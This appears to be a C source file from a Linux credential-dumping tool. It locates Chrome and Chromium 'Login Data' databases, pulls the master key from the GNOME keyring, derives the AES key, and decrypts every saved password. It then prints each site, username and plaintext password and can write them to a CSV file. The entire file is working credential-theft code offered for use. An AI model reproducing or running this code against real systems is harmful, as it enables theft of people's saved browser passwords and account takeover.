#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sqlite3.h>
#include <libsecret/secret.h>

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#include "args.h"
#include "chrome.h"

const SecretSchema * get_chrome_like_schema (void) G_GNUC_CONST;
#define CHROME_LIKE_SCHEMA  get_chrome_like_schema ()

const SecretSchema *
get_chrome_like_schema (void)
{
    static const SecretSchema the_schema = {
        "chrome_libsecret_os_crypt_password_v2", SECRET_SCHEMA_NONE,
        {
            {  "application", SECRET_SCHEMA_ATTRIBUTE_STRING },
	    {  NULL, 0  }
        },
	0, 0, 0, 0, 0, 0, 0, 0 
    };
    return &the_schema;
}

/**
 * Safe wrapper to use strncpy()
 *
 */
void safe_strcpy(char *dst, char *src, int len) {
	strncpy(dst, src, len);
	dst[len] = '\0';
}

/**
 * Returns the GNOME secret with the Login Data file path
 * 
 * @return 1 on success, -1 on failure
 */
int get_gnome_masterkey(char *login_data_path, char **masterkey) {
	char chrome[SECRET_QUERY_SIZE];
	if(strstr(login_data_path, "chrome")) {
		safe_strcpy(chrome, "chrome", strlen("chrome"));
	}
	else {
		safe_strcpy(chrome, "chromium", strlen("chromium"));
	}

	GError *error = NULL;
	gchar *password = secret_password_lookup_sync(CHROME_LIKE_SCHEMA, NULL, &error, "application", chrome, NULL);
	if (error != NULL) {
		fprintf(stderr, "secret_password_lookup_sync() failure\n");
		g_error_free(error);
		return -1;
	}
	else if (password == NULL) {
		fprintf(stderr, "secret_password_lookup_sync() failure\n");
		return -1;
	}
	else {
		*masterkey = (char *)malloc(strlen(password)+1); 
		if(*masterkey == 0) {
			fprintf(stderr, "malloc() failure\n");
			free(*masterkey);
			return -1;
		}
		memcpy(*masterkey, password, strlen(password));
		(*masterkey)[strlen(password)] = '\0';
		secret_password_free(password);
		return 1;
	}
}

/** 
 * AES decrypt the cipher_password with the IV and the key
 * 
 * @return 1 on success, -1 on failure
 */
int aes_decrypt(EVP_CIPHER_CTX *ctx, char *cipher_password, char **plaintext_password, char *iv, char *output_key) {
	int len;
	int plaintext_len;
	
	// We remove the 3 first bytes to get a valid multiple of the block size
	// We don't need the 3 first bytes
	char *good_cipher_password = &cipher_password[3];

	// TODO: cipher text apparently can have null byte within them - Handle that
	// The ciphertext is always greater or equal to the length of the plaintext
	*plaintext_password = (unsigned char *)malloc(strlen((const char *)good_cipher_password));
	if(*plaintext_password == 0) {
		fprintf(stderr, "malloc() failure\n");
		free(*plaintext_password);
		return -1;
	}

	printf("[*] Cipher text length: %ld\n", strlen((const char *)good_cipher_password));

	if(!(ctx = EVP_CIPHER_CTX_new())) {
		fprintf(stderr, "EVP_CIPHER_CTX_new() failure\n");
		return -1;
	}
	if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, output_key, iv)) {
		fprintf(stderr, "EVP_DecryptInit_ex() failure\n");
		ERR_print_errors_fp(stderr);
		return -1;
	}
	
	// Disabling padding is actually useless we already have a valid ciphertext length
	//EVP_CIPHER_CTX_set_padding(ctx, 0);

	if(1 != EVP_DecryptUpdate(ctx, *plaintext_password, &len, good_cipher_password, strlen((const char *)good_cipher_password))) {
		fprintf(stderr, "EVP_DecryptUpdate() failure\n");
		ERR_print_errors_fp(stderr);
		return -1;
	}
	plaintext_len = len;

	if(1 != EVP_DecryptFinal_ex(ctx, *plaintext_password+len, &len)) {
		fprintf(stderr, "EVP_DecryptFinal_ex() failure\n");
		ERR_print_errors_fp(stderr);
		return -1;
	}
	plaintext_len += len;
	(*plaintext_password)[plaintext_len] = '\0';
	EVP_CIPHER_CTX_free(ctx);

	return 1;
}

/** 
 * Prepare the sqlite3 statement to retrieve the creds from the db
 *
 * @return 1 on success, -1 on failure
 */
int prepare_sqlite_statement(char *login_data_path, sqlite3 **db, sqlite3_stmt **stmt) {
	int rc = sqlite3_open(login_data_path, db);
	if(rc != SQLITE_OK) {
		fprintf(stderr, "sqlite3_open() failure: %s\n", sqlite3_errmsg(*db));
		sqlite3_close(*db);
		return -1;
	}
	char *sql = "SELECT action_url, username_value, password_value FROM logins";
	rc = sqlite3_prepare_v2(*db, sql, -1, stmt, NULL);
	if(rc != SQLITE_OK) {
		fprintf(stderr, "sqlite3_prepare_v2() failure\n");
		sqlite3_close(*db);
		return -1;
	}
	return 1;
}

/**
 * Fetch the data of the sqlite3 query
 *
 * @return 1 on success, -1 on failure
 */
int fetch_sqlite_data(char **website, char **username, char **cipher_password, sqlite3_stmt **stmt) {
	// TODO: View better alternative to strncpy
	*website = malloc(strlen(sqlite3_column_text(*stmt, 0))+1);
	*username = malloc(strlen(sqlite3_column_text(*stmt, 1))+1);
	*cipher_password = malloc(strlen(sqlite3_column_text(*stmt, 2)+1));
	if(*website == 0 || *username == 0 || *cipher_password == 0) {
		fprintf(stderr, "malloc() failure\n");
		free(*website);
		free(*username);
		free(*cipher_password);
		return -1;
	}

	safe_strcpy(*website, (char *)sqlite3_column_text(*stmt, 0), strlen(sqlite3_column_text(*stmt, 0)));
	safe_strcpy(*username, (char *)sqlite3_column_text(*stmt, 1), strlen(sqlite3_column_text(*stmt, 1)));
	safe_strcpy(*cipher_password, (char *)sqlite3_column_text(*stmt, 2), strlen(sqlite3_column_text(*stmt, 2)));

	return 1;
}

/**
 * Main function that tries to retrieve the creds
 *
 * @return 1 on success, -1 on failure
 */
int get_chrome_creds(char *login_data_path, char *output, char *master_password) {
	sqlite3 *db;
	sqlite3_stmt *stmt;
	if(prepare_sqlite_statement(login_data_path, &db, &stmt) == -1) {
		fprintf(stderr, "prepare_sqlite3_statement() failure\n");
		return -1;
	}
	 
	// 1 - We get the GNOME masterkey
	char *masterkey;
	if(get_gnome_masterkey(login_data_path, &masterkey) == -1) {
		fprintf(stderr, "get_gnome_masterkey() failure\n");
		return -1;
	}
	printf("[*] Master Key: %s \n", masterkey);

	// 2 - We get the PBKDF2 key 
	char output_key[KEY_LENGTH];
	char *salt = "saltysalt";
	if(PKCS5_PBKDF2_HMAC(masterkey, strlen(masterkey), salt, strlen(salt), 1, EVP_sha1(), KEY_LENGTH, output_key) == 0) {
		fprintf(stderr, "PKCS5_PBKDF2_HMAC() failure\n");
		return -1;
	}
	printf("[*] PBKDF2 key: ");
	for(int i=0;i<KEY_LENGTH;i++) { 
		printf("%02x", output_key[i]);  
	} 
	printf("\n\n");

	char *website;
	char *username;
	char *cipher_password;
	char *plaintext_password;

	EVP_CIPHER_CTX *ctx;
	char *iv = "                ";

	FILE *output_fd;
	if(output != NULL) {
		output_fd = fopen(output, "ab");
	}

	while(sqlite3_step(stmt) != SQLITE_DONE) {
		if(fetch_sqlite_data(&website, &username, &cipher_password, &stmt) == -1) {
			fprintf(stderr, "fetch_sqlite_data() failure\n");
			return -1;
		} 
		
		if(aes_decrypt(ctx, cipher_password, &plaintext_password, iv, output_key) == -1) {
			fprintf(stderr, "AES Decryption failure\n");
			return -1;
		};

		printf("[+] Website: %s\n[+] Username: %s\n[+] Password: %s\n\n", 
			website,
			username,
			plaintext_password);

		if(output != NULL) {
			fprintf(output_fd, "\"%s\",\"%s\",\"%s\"\n", 
				website,
				username,
				plaintext_password);
		}
		free(website);
		free(username);
		free(cipher_password);
		free(plaintext_password);
	}

	if(output != NULL) {
		fclose(output_fd);
	}

	free(masterkey);
	sqlite3_close(db);

	return 1;
}

int dump_chrome(struct arguments *args) {
	int result = 0;
	char chrome_path[MAX_PATH];
	char chrome_login_data_path[MAX_PATH];
	char chromium_path[MAX_PATH];
	char chromium_login_data_path[MAX_PATH];
	//char brave_path[MAX_PATH];
	//char brave_login_data_path[MAX_PATH];

	// TODO: Add brave support

	// For Linux
	char *home = getenv("HOME");
	snprintf(chrome_path, MAX_PATH, "%s/.config/google-chrome/Default", home);
	snprintf(chrome_login_data_path, MAX_PATH, "%s/Login Data", chrome_path);
	snprintf(chromium_path, MAX_PATH, "%s/.config/chromium/Default", home);
	snprintf(chromium_login_data_path, MAX_PATH, "%s/Login Data", chromium_path);
	//snprintf(brave_path, MAX_PATH, "%s/.config/BraveSoftware/Brave-Browser/Default", home);
	//snprintf(brave_login_data_path, "%s/Login Data", brave_path);
	// End for linux

	if(access(chrome_login_data_path,F_OK) != -1  ) {
		printf("[*] Starting Chrome credentials dump...\n\n");
		result = get_chrome_creds(chrome_login_data_path, args->output_file, args->master_password);
	}

	if(access(chromium_login_data_path, F_OK) != -1) {
		printf("[*] Starting Chromium credentials dump...\n\n");
		result = get_chrome_creds(chromium_login_data_path, args->output_file, args->master_password);
	} 

	//if(access(brave_login_data_path, F_OK) != -1) {
	//	printf("[*] Starting Brave credentials dump...\n\n");
	//	result = get_creds(brave_login_data_path, output);
	//}

	if(result == 0) {
		fprintf(stderr, "[-] Couldn't find any Chrome / Chromium installation\n");
		return -1;
	}
	else if (result == -1) {
		fprintf(stderr, "[-] An error occured\n");
		return -1;
	}
	return 1;
}
